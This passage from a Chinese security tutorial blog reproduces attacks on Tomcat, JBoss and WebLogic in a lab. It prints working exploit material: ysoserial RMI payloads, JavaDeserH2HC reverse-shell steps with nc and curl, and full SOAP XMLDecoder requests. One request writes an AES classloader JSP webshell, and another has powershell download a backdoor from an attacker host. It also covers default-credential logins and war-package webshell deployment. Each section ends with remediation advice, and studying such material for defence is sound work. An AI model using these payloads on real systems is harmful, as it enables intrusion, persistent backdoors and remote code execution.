<pre class="line-numbers language-none"><code class="language-none">set CATALINA_OPTS=-Dcom.sun.management.jmxremote.ssl=false - Dcom.sun.management.jmxremote.authenticate=false<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211225162201007.png" alt="image-20211225162201007"></p>
<blockquote>
<p>-Dcom.sun.management.jmxremote.ssl=false 指定是否使用SSL通讯</p>
<p>-Dcom.sun.management.jmxremote.authenticate=false 指定是否需要密码验证</p>
</blockquote>
<p>启动 startup.bat  netstat -ano 查看端口</p>
<p><img src="/2021/12/09/day36/image-20211225162248796.png" alt="image-20211225162248796"></p>
<p>下载ysoserial</p>
<p>payload</p>
<pre class="line-numbers language-none"><code class="language-none">java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 192.168.0.167 10001 Groovy1 "calc.exe"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>返回靶机看到弹出了计算机</p>
<p><img src="/2021/12/09/day36/image-20211225162325126.png" alt="image-20211225162325126"></p>
<h4 id="修复-19"><a href="#修复-19" class="headerlink" title="修复"></a>修复</h4><ol>
<li>关闭 JmxRemoteLifecycleListener 功能，或者是对 jmx JmxRemoteLifecycleListener 远程端口进行网络访问控制。同时，增加严格的认证方式。</li>
<li>升级版本</li>
</ol>
<h3 id="文件包含漏洞-CVE-2020-1938"><a href="#文件包含漏洞-CVE-2020-1938" class="headerlink" title="文件包含漏洞(CVE-2020-1938)"></a>文件包含漏洞(CVE-2020-1938)</h3><p>攻击者可利用该漏洞读取或包含 Tomcat上所有 webapp 目录下的任意文件，如：webapp 配置文件或源代码等</p>
<p>影响版本：</p>
<p>Apache Tomcat 6 </p>
<p>Tomcat 7系列 &lt;7.0.100 </p>
<p>Tomcat 8系列 &lt; 8.5.51 </p>
<p>Tomcat 9 系列 &lt;9.0.31</p>
<h4 id="原理-20"><a href="#原理-20" class="headerlink" title="原理"></a>原理</h4><p>tomcat在接收ajp请求的时候调用org.apache.coyote.ajp.AjpProcessor来处理ajp消息，prepareRequest将ajp里面的内容取出来设置成request对象的Attribute属性。可以通过此种特性从而可以控制request对象的下面三个Attribute属性</p>
<p>javax.servlet.include.request_uri</p>
<p>javax.servlet.include.path_info</p>
<p>javax.servlet.include.servlet_path</p>
<p>再通过控制ajp控制的上述三个属性来读取文件,通过操控上述三个属性从而可以读取到应用目录下的任何文件。</p>
<h4 id="复现-20"><a href="#复现-20" class="headerlink" title="复现"></a>复现</h4><p>tomcat默认的conf/server.xml中配置了2个Connector，一个为8080的对外提供的HTTP协议端口，另外一个就是默认的8009 AJP协议端口，两个端口默认均监听在外网ip。</p>
<p><img src="/2021/12/09/day36/image-20211225164030272.png" alt="image-20211225164030272"></p>
<p><img src="/2021/12/09/day36/image-20211225164049089.png" alt="image-20211225164049089"></p>
<p>默认设置，启动startup.bat</p>
<p>打开kali使用payload攻击</p>
<pre class="line-numbers language-none"><code class="language-none">https://github.com/xindongzhuaizhuai/CVE-2020-1938<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">python CVE-2020-1938.py -p 8009 -f WEB-INF/web.xml 192.168.80.131<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211225164242724.png" alt="image-20211225164242724"></p>
<p>可以看到读取到了文件</p>
<h4 id="修复-20"><a href="#修复-20" class="headerlink" title="修复"></a>修复</h4><ol>
<li><p>升级到安全版本</p>
<p>Apache Tomcat 7.0.100</p>
<p>Apache Tomcat 8.5.51</p>
<p>Apache Tomcat 9.0.31</p>
</li>
<li><p>.关闭AJP服务，修改Tomcat配置文件Service.xml,注释掉</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;Connector port="8009" protocol="AJP/1.3" redirectPort="8443" /&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li><p>配置ajp配置中的secretRequired跟secret属性来限制认证</p>
</li>
</ol>
<h2 id="jboss"><a href="#jboss" class="headerlink" title="jboss"></a>jboss</h2><blockquote>
<p>JBoss是一个基于J2EE的开放源代码应用服务器，代码遵循LGPL许可，可以在任何商业应用中免费使用； JBoss也是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3规范。但JBoss核心服务不包括支 持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。在J2EE应用服务器领域，JBoss是发展最为 迅速的应用服务器。由于JBoss遵循商业友好的LGPL授权分发，并且由开源社区开发，这使得JBoss广为流 行。</p>
</blockquote>
<p>目录 描述</p>
<pre class="line-numbers language-none"><code class="language-none">bin 启动和关闭JBoss 的脚本

client 客户端与JBoss 通信所需的Java 库（JARs）

docs 配置的样本文件（数据库配置等）

docs/dtd 在JBoss 中使用的各种XML 文件的DTD 。

lib 一些JAR，JBoss 启动时加载，且被所有JBoss 配置共享。（不要把你的库放在这里）

server 各种JBoss 配置。每个配置必须放在不同的子目录。子目录的名字表示配置的名字。JBoss 包含3个默认的配置：minimial，default 和all，在你安装时可以进行选择。

server/all JBoss 的完全配置，启动所有服务，包括集群和IIOP 。(本教程就采用此配置) 

server/default JBoss 的默认配置。在没有在JBoss 命令航中指定配置名称时使用。(本教程没有安装此配置，如果不指定配置名称，启动将会出错) 

server/all/conf JBoss 的配置文件。

server/all/data JBoss 的数据库文件。比如，嵌入的数据库，或者JBossMQ。

server/all/deploy JBoss 的热部署目录。放到这里的任何文件或目录会被JBoss 自动部署。EJB、WAR 、EAR，甚至服务。

server/all/lib 一些JAR，JBoss 在启动特定配置时加载他们。(default 和minimial 配置也包含这个和下面两个目录。) 

server/all/log JBoss 的日志文件

server/all/tmp JBoss 的临时文件。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="JMX-Console未授权访问Getshell"><a href="#JMX-Console未授权访问Getshell" class="headerlink" title="JMX Console未授权访问Getshell"></a>JMX Console未授权访问Getshell</h3><p>Jboxx4.x /jmx-console/ 后台存在未授权访问，进入后台后，可直接部署 war 包Getshell。若需登录，可以尝试爆破弱口令登录。</p>
<h4 id="原理-21"><a href="#原理-21" class="headerlink" title="原理"></a>原理</h4><p>由于JBoss中/jmx-console/HtmlAdaptor路径对外开放，并且没有任何身份验证机制，导致攻击者可以进⼊到jmx控制台，并在其中执⾏任何功能。</p>
<p>影响版本：Jboss4.x以下</p>
<h4 id="复现-21"><a href="#复现-21" class="headerlink" title="复现"></a>复现</h4><p>我们访问靶机的8080端口</p>
<p><img src="/2021/12/09/day36/image-20211225172339545.png" alt="image-20211225172339545"></p>
<p>进入</p>
<p><img src="/2021/12/09/day36/image-20211225184053643.png" alt="image-20211225184053643"></p>
<p>然后找到jboss.deployment（jboss 自带的部署功能）中的flavor=URL,type=DeploymentScanner点进去（通过 url 的方式远程部署）</p>
<p><img src="/2021/12/09/day36/image-20211225184130214.png" alt="image-20211225184130214"></p>
<p>找到页面中的void addURL()选项来远程加载war包来部署，写入war包的url</p>
<p><img src="/2021/12/09/day36/image-20211225184317794.png" alt="image-20211225184317794"></p>
<p>将冰蝎的shell.jsp压缩为zip，改名为war即可</p>
<p>上传后返回到console，找到jboss.web.deployment，如果找到刚刚上传的war说明上传成功</p>
<p><img src="/2021/12/09/day36/image-20211225185011948.png" alt="image-20211225185011948"></p>
<pre class="line-numbers language-none"><code class="language-none">http://192.168.0.179:8080/1/1.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这个地址连接即可</p>
<h4 id="修复-21"><a href="#修复-21" class="headerlink" title="修复"></a>修复</h4><ol>
<li>升级jboss</li>
<li>关闭jmx-console和web-console，提高安全性</li>
</ol>
<h3 id="反序列化命令执行漏洞-CVE-2017-12149"><a href="#反序列化命令执行漏洞-CVE-2017-12149" class="headerlink" title="反序列化命令执行漏洞(CVE-2017-12149)"></a>反序列化命令执行漏洞(CVE-2017-12149)</h3><h4 id="原理-22"><a href="#原理-22" class="headerlink" title="原理"></a>原理</h4><p>在Jboss Application Server中，HTTP Invoker的ReadOnlyAccessFilter中的doFilter方法不限制对其执行反序列化的类，从而使攻击者可以通过精心制作的序列化数据执行任意代码</p>
<p>影响版本：</p>
<p>5.x/6.x</p>
<h4 id="复现-22"><a href="#复现-22" class="headerlink" title="复现"></a>复现</h4><p>我们打开靶机的jboss服务，run.bat</p>
<p>访问靶机的8080，查看jboss版本</p>
<p><img src="/2021/12/09/day36/image-20211226153936189.png" alt="image-20211226153936189"></p>
<p>此版本很可能存在此漏洞</p>
<p>该漏洞出现在/invoker/readonly中 ，服务器将用户post请求内容进行反序列化</p>
<p>我们可以访问路径来判断是否存在此漏洞</p>
<pre class="line-numbers language-none"><code class="language-none">http://192.168.0.179:8080/invoker/readonly<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211226154136489.png" alt="image-20211226154136489"></p>
<p>也可以使用工具进行检测 DeserializeExploit</p>
<pre class="line-numbers language-none"><code class="language-none">https://cdn.vulhub.org/deserialization/DeserializeExploit.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211226154552283.png" alt="image-20211226154552283"></p>
<p>成功的话可以直接执行命令</p>
<p>也可以使用JavaDeserH2HC进行反弹shell ，需要java8环境</p>
<pre class="line-numbers language-none"><code class="language-none">https://github.com/joaomatosf/JavaDeserH2HC<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>进行操作前删除这俩个文件</p>
<p><img src="/2021/12/09/day36/image-20211226160007702.png" alt="image-20211226160007702"></p>
<pre class="line-numbers language-none"><code class="language-none">创建class文件 
javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java 

监听kali 9999端口 
nc -lvnp 9999

创建反序列化文件 
java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.0.182:9999 

psot提交 
curl http://192.168.0.179:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211226155848743.png" alt="image-20211226155848743"></p>
<p>可以看到成功反弹了</p>
<h4 id="修复-22"><a href="#修复-22" class="headerlink" title="修复"></a>修复</h4><ol>
<li><p>不需要 http-invoker.sar 组件的用户可直接删除此组件</p>
</li>
<li><p>添加如下代码至 http-invoker.sar 下 web.xml 的 security-constraint 标签中，对 http invoker 组件进行访问控制：</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;url-pattern&gt;/*&lt;/url-pattern&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li><p>升级版本</p>
</li>
</ol>
<h3 id="admin-Console后台部署war包Getshell"><a href="#admin-Console后台部署war包Getshell" class="headerlink" title="admin-Console后台部署war包Getshell"></a>admin-Console后台部署war包Getshell</h3><p>Jboss 5.x/6.x admin-console和web-console的账号密码是一样的。因此当web-console无法部署war包时，可以使用admin-console来部署。前提是先得到账号密码，密码保存在jboss/server/default/conf/props/jmx-console-users.properties</p>
<p>影响版本：5.x/6.x</p>
<h4 id="复现-23"><a href="#复现-23" class="headerlink" title="复现"></a>复现</h4><p>进入admin-console，输入账号密码，不知道的话可以穷举看看</p>
<pre class="line-numbers language-none"><code class="language-none">http://192.168.0.179:8080/admin-console/login.seam?conversationId=2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>admin admin 进入</p>
<p><img src="/2021/12/09/day36/image-20211226174839088.png" alt="image-20211226174839088"></p>
<p>在web application找到了上传war包的地方，我们还是用冰蝎的war包，whell.war</p>
<p><img src="/2021/12/09/day36/image-20211226175315367.png" alt="image-20211226175315367"></p>
<p>可以看到上传成功了</p>
<p>点击可以看到路径</p>
<p>冰蝎也能连接</p>
<p><img src="/2021/12/09/day36/image-20211226175547118.png" alt="image-20211226175547118"></p>
<h4 id="修复-23"><a href="#修复-23" class="headerlink" title="修复"></a>修复</h4><p>不要使用弱口令</p>
<h3 id="JBOSSMQ-JMS-集群反序列化漏洞-CVE-2017-7504"><a href="#JBOSSMQ-JMS-集群反序列化漏洞-CVE-2017-7504" class="headerlink" title="JBOSSMQ JMS 集群反序列化漏洞 (CVE-2017-7504)"></a>JBOSSMQ JMS 集群反序列化漏洞 (CVE-2017-7504)</h3><p>JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java⽂件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利⽤该漏洞执⾏任意代码</p>
<p>影响版本：JBoss AS 4.x及之前版本</p>
<h4 id="复现-24"><a href="#复现-24" class="headerlink" title="复现"></a>复现</h4><p>我们将靶机恢复到4.x版本，启动jboss</p>
<p><img src="/2021/12/09/day36/image-20211226180655069.png" alt="image-20211226180655069"></p>
<p>我们验证是否存在此漏洞</p>
<p>访问/jbossmq-httpil/HTTPServerILServlet 此路径，若为200，则可能存在此漏洞</p>
<p><img src="/2021/12/09/day36/image-20211226181045102.png" alt="image-20211226181045102"></p>
<p>我们还是用JavaDeserH2HC这个工具反弹shell，步骤不变，最后curl改下就行</p>
<pre class="line-numbers language-none"><code class="language-none">curl http://192.168.0.179:8080/jbossmq httpil/HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211226181410902.png" alt="image-20211226181410902"></p>
<h4 id="修复-24"><a href="#修复-24" class="headerlink" title="修复"></a>修复</h4><p>升级版本</p>
<h2 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h2><p>WebLogic是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
<p>WebLogic是美商Oracle的主要产品之一，是并购BEA得来。是商业市场上主要的Java（J2EE）应用服务器软件（application server）之一，是世界上第一个成功商业化的J2EE应用服务器, 已推出到12c(12.2.1.4) 版。而此产品也延伸出WebLogic Portal，WebLogic Integration等企业用的中间件（但当下Oracle主要以Fusion Middleware融合中间件来取代这些WebLogic Server之外的企业包），以及OEPE(Oracle Enterprise Pack for Eclipse)开发工具。</p>
<h3 id="弱口令getshell漏洞"><a href="#弱口令getshell漏洞" class="headerlink" title="弱口令getshell漏洞"></a>弱口令getshell漏洞</h3><h4 id="原理-23"><a href="#原理-23" class="headerlink" title="原理"></a>原理</h4><p>搭建好weblogic之后没有修改进入后台的密码</p>
<h4 id="复现-25"><a href="#复现-25" class="headerlink" title="复现"></a>复现</h4><p>打进好weblogic之后，</p>
<pre class="line-numbers language-none"><code class="language-none">C:\Oracle\Middleware\user_projects\domains\base_domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>startweblogic.cmd开启weblogic</p>
<p>访问登录界面</p>
<pre class="line-numbers language-none"><code class="language-none">192.168.80.132:7001/console/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211226184826105.png" alt="image-20211226184826105"></p>
<p>存放了一些弱口令</p>
<pre class="line-numbers language-none"><code class="language-none">http://cirt.net/passwords?criteria=weblogic<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>weblogic/Oracle@123登陆后台</p>
<p><img src="/2021/12/09/day36/image-20211226185313233.png" alt="image-20211226185313233"></p>
<p>这里显然是一个可以利用上传war包的点，安装-上传文件</p>
<p><img src="/2021/12/09/day36/image-20211226190225428.png" alt="image-20211226190225428"></p>
<p>成功用冰蝎连接了</p>
<h4 id="修复-25"><a href="#修复-25" class="headerlink" title="修复"></a>修复</h4><p>使用强口令</p>
<h3 id="XMLDecoder反序列化漏洞-CVE-2017-3506"><a href="#XMLDecoder反序列化漏洞-CVE-2017-3506" class="headerlink" title="XMLDecoder反序列化漏洞(CVE-2017-3506)"></a>XMLDecoder反序列化漏洞(CVE-2017-3506)</h3><h4 id="原理-24"><a href="#原理-24" class="headerlink" title="原理"></a>原理</h4><p>构造SOAP（XML）格式的请求，在解析的过程中导致XMLDecoder反序列化漏洞</p>
<p>影响版本：10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0, 12.2.1.2.0</p>
<h4 id="复现-26"><a href="#复现-26" class="headerlink" title="复现"></a>复现</h4><p>访问以下目录中的一种，如果存在回显，说明可能存在此漏洞</p>
<pre class="line-numbers language-none"><code class="language-none">/wls-wsat/CoordinatorPortType 

/wls-wsat/RegistrationPortTypeRPC 

/wls-wsat/ParticipantPortType 

/wls-wsat/RegistrationRequesterPortType 

/wls-wsat/CoordinatorPortType11 

/wls-wsat/RegistrationPortTypeRPC11 

/wls-wsat/ParticipantPortType11 

/wls-wsat/RegistrationRequesterPortType11<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211226190631420.png" alt="image-20211226190631420"></p>
<p>构造好要放松的post包</p>
<pre class="line-numbers language-none"><code class="language-none">POST /wls-wsat/CoordinatorPortType HTTP/1.1 
Host: 192.168.80.132:7001 
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 
Accept: text/hAccept-Encoding: gzip, deflate 
Accept: */* 
Accept-Language: en 
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) 
Connection: close 
Content-Type: text/xml 
Content-Length: 1228 

&lt;soapenv:Envelopexmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt; 
&lt;soapenv:Header&gt; 
&lt;work:WorkContextxmlns:work="http://bea.com/2004/06/soap/workarea/"&gt; 
&lt;java&gt;&lt;java version="1.4.0" class="java.beans.XMLDecoder"&gt; 
&lt;object class="java.io.PrintWriter"&gt;

&lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp&lt;/string&gt; 
&lt;void method="println"&gt;&lt;string&gt; 
&lt;![CDATA[ 
&lt;%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%&gt;&lt;%!class Uextends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if (request.getMethod().equals("POST")) {String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInsta nce().equals(pageContext);}%&gt; 
]]&gt; 

&lt;/string&gt; 
&lt;/void&gt; 
&lt;void method="close"/&gt; 
&lt;/object&gt;&lt;/java&gt;&lt;/java&gt; 
&lt;/work:WorkContext&gt; 
&lt;/soapenv:Header&gt; 
&lt;soapenv:Body/&gt;
&lt;/soapenv:Envelope&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>提交</p>
<p>访问后门地址</p>
<pre class="line-numbers language-none"><code class="language-none">http://192.168.80.132:7001/bea_wls_internal/test.jsp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211226192827657.png" alt="image-20211226192827657"></p>
<h4 id="修复-26"><a href="#修复-26" class="headerlink" title="修复"></a>修复</h4><ol>
<li><p>更新到最新版本,打上10271的补丁,对访问wls-wsat的资源进行访问控制</p>
</li>
<li><p>或者根据业务所有需求，考虑是否删除WLS-WebServices组件。包含此组件路径为：</p>
<pre class="line-numbers language-none"><code class="language-none">Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat

Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war

Middleware/wlserver_10.3/server/lib/wls-wsat.war<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>以上路径都在WebLogic安装处。删除以上文件之后，需重启WebLogic。确认<a target="_blank" rel="noopener" href="http://weblogic_ip/wls-wsat/">http://weblogic_ip/wls-wsat/</a> 是否为404页面</p>
</li>
</ol>
<h3 id="wls-wsat反序列化漏洞-CVE-2019-2725"><a href="#wls-wsat反序列化漏洞-CVE-2019-2725" class="headerlink" title="wls-wsat反序列化漏洞(CVE-2019-2725)"></a>wls-wsat反序列化漏洞(CVE-2019-2725)</h3><p>CVE-2019-2725是一个Oracle weblogic反序列化远程命令执行漏洞</p>
<h4 id="原理-25"><a href="#原理-25" class="headerlink" title="原理"></a>原理</h4><p>根据weblogic的xmldecoder反序列化漏洞，通过针对Oracle官网历年来的补丁构造payload来绕过。</p>
<p>影响版本：</p>
<p>weblogic 10.x</p>
<p>weblogic 12.1.3</p>
<h4 id="复现-27"><a href="#复现-27" class="headerlink" title="复现"></a>复现</h4><p>漏洞存在于：/_async/AsyncResponseService，访问地址，如果可以访问则存在漏洞：</p>
<p><img src="/2021/12/09/day36/image-20211226194549297.png" alt="image-20211226194549297"></p>
<p>我们构造包含poc的burppost包，来做到下载远程后门到指定目录</p>
<pre class="line-numbers language-none"><code class="language-none">POST /_async/AsyncResponseService HTTP/1.1 
Host: 192.168.80.132:7001 
Content-Length: 910 
Accept-Encoding: gzip, deflate SOAPAction: 
Accept: */* 
User-Agent: Apache-HttpClient/4.1.1 (java 1.5) 
Connection: keep-alive 
content-type: text/xml 

&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" 
xmlns:asy="http://www.bea.com/async/AsyncResponseService"&gt; 
&lt;soapenv:Header&gt; 
&lt;wsa:Action&gt;xx&lt;/wsa:Action&gt; 
&lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt; 
&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt; 
&lt;void class="java.lang.ProcessBuilder"&gt; 
&lt;array class="java.lang.String" length="3"&gt; 
&lt;void index="0"&gt; 
&lt;string&gt;cmd&lt;/string&gt; 
&lt;/void&gt; 
&lt;void index="1"&gt; 
&lt;string&gt;/c&lt;/string&gt; 
&lt;/void&gt; 
&lt;void index="2"&gt; 
&lt;string&gt;powershell(new-object System.Net.WebClient).DownloadFile('http://192.168.0.182:81/shell.jsp.txt','servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp ')&lt;/string&gt; 
&lt;/void&gt;
&lt;/array&gt; 
&lt;void method="start"/&gt;&lt;/void&gt; 
&lt;/work:WorkContext&gt; 
&lt;/soapenv:Header&gt; 
&lt;soapenv:Body&gt; 
&lt;asy:onAsyncDelivery/&gt; 
&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>提交后</p>
<pre class="line-numbers language-none"><code class="language-none">192.168.80.132:7001/_async/webshell.jsp <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>连接后门</p>
<p><img src="/2021/12/09/day36/image-20211226194919962.png" alt="image-20211226194919962"></p>
<h4 id="修复-27"><a href="#修复-27" class="headerlink" title="修复"></a>修复</h4><ol>
<li>禁用bea_wls9_async_response组件</li>
<li>删除wls9_async_response的war包并重启</li>
<li>禁止访问 /_async/* 路径。</li>
</ol>
<h3 id="T3协议反序列化命令执行漏洞-CVE-2018-2628"><a href="#T3协议反序列化命令执行漏洞-CVE-2018-2628" class="headerlink" title="T3协议反序列化命令执行漏洞(CVE-2018-2628)"></a>T3协议反序列化命令执行漏洞(CVE-2018-2628)</h3><h4 id="原理-26"><a href="#原理-26" class="headerlink" title="原理"></a>原理</h4><p>Weblogic Server中的RMI 通信使用T3协议在Weblogic Server和其它Java程序（客户端或者其它Weblogic Server实例）之间传输数据, 服务器实例会跟踪连接到应用程序的每个Java虚拟机（JVM）中,并创建T3协议通信连接, 将流量传输到Java虚拟机. T3协议在开放WebLogic控制台端口的应用上默认开启. </p>
<p>攻击者可以通过T3协议发送恶意的的反序列化数据, 进行反序列化, 实现对存在漏洞的weblogic组件的远程代码执行攻击</p>
<h4 id="复现-28"><a href="#复现-28" class="headerlink" title="复现"></a>复现</h4><p>起来环境</p>
<p><img src="/2021/12/09/day36/image-20211227102452047.png" alt="image-20211227102452047"></p>
<p>kaliz中下载poc</p>
<pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/jas502n/CVE-2018-2628.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>本地起来这个工具</p>
<p><img src="/2021/12/09/day36/image-20211227102559416.png" alt="image-20211227102559416"></p>
<p>可以看到给出了一个shell位置</p>
<p>在poc目录下执行命令，用于连接shell</p>
<pre class="line-numbers language-none"><code class="language-none">python getshell\ cve-2018-2628.py <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>执行完后填写shell地址可以看到反弹了</p>
<p><img src="/2021/12/09/day36/image-20211227103744511.png" alt="image-20211227103744511"></p>
<h4 id="修复-28"><a href="#修复-28" class="headerlink" title="修复"></a>修复</h4><ol>
<li>及时更新补丁</li>
<li>禁用T3协议</li>
<li>禁止T3端口对外开放, 或者限制可访问T3端口的IP来源</li>
</ol>
<h3 id="文件上传-CVE-2018-2894"><a href="#文件上传-CVE-2018-2894" class="headerlink" title="文件上传(CVE-2018-2894)"></a>文件上传(CVE-2018-2894)</h3><p>Weblogic Web Service Test Page中存在任意文件上传漏洞，Web ServiceTest Page 在 ‘生产模式’ 下默认不开启，所以该漏洞有一定限制。</p>
<p>两个页面分别为/ws_utc/begin.do和/ws_utc/config.do。</p>
<h4 id="原理-27"><a href="#原理-27" class="headerlink" title="原理"></a>原理</h4><p>Weblogic管理端未授权的两个页面存在任意上传jsp文件漏洞，进而获取服务器权限。</p>
<h4 id="复现-29"><a href="#复现-29" class="headerlink" title="复现"></a>复现</h4><p>再靶机里打开vulhub的docker环境</p>
<pre class="line-numbers language-none"><code class="language-none">cd vulhub-master/weblogic/CVE-2018-2894
sudo docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>如果失败，排除网络问题，可能是没安装compose，安装compose</p>
<pre class="line-numbers language-none"><code class="language-none">sudo apt install docker-compose <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211227145822767.png" alt="image-20211227145822767"></p>
<p><img src="/2021/12/09/day36/image-20211227145846145.png" alt="image-20211227145846145"></p>
<pre class="line-numbers language-none"><code class="language-none">http://192.168.80.133:7001/console/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211227150332458.png" alt="image-20211227150332458"></p>
<p>可以看到环境起来了</p>
<p>这里我们需要登录，我们在靶机获取下 账号密码</p>
<pre class="line-numbers language-none"><code class="language-none">sudo docker-compose logs | grep password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211227150610782.png" alt="image-20211227150610782"></p>
<p>weblogic  登录</p>
<p><img src="/2021/12/09/day36/image-20211227151107804.png" alt="image-20211227151107804"></p>
<p>base_domain，高级，在  启用web服务测试页  选项打勾， 保存</p>
<p><img src="/2021/12/09/day36/image-20211227151247335.png" alt="image-20211227151247335"></p>
<p>在此开发环境下有俩个测试页，分别为 config.do 和 begin.do</p>
<h5 id="config-do页面"><a href="#config-do页面" class="headerlink" title="config.do页面"></a>config.do页面</h5><p>首先进入config.do，<strong>将目录设置为 ws_utc 应用的静态文件css目录，访问这个目录是无需权限的</strong></p>
<pre class="line-numbers language-none"><code class="language-none">http://192.168.80.133:7001/ws_utc/config.do<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2021/12/09/day36/image-20211227152450020.png" alt="image-20211227152450020"></p>
<p>路径</p>
<pre class="line-numbers language-none"><code class="language-none">/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>提交后，保存成功</p>
<p>然后我们在安全这里点添加，可以看到可上传文件，这里上传一个冰蝎的jsp后门</p>
<p><img src="/2021/12/09/day36/image-20211227152833846.png" alt="image-20211227152833846"></p>
<p>上传成功后我们需要知道连接的路径，抓包试试</p>
<p><img src="/2021/12/09/day36/image-20211227153621563.png" alt="image-20211227153621563"></p>
<p>猜测它上传上去的文件名 是时间戳_文件名</p>
<p>我们猜测出上传路径</p>
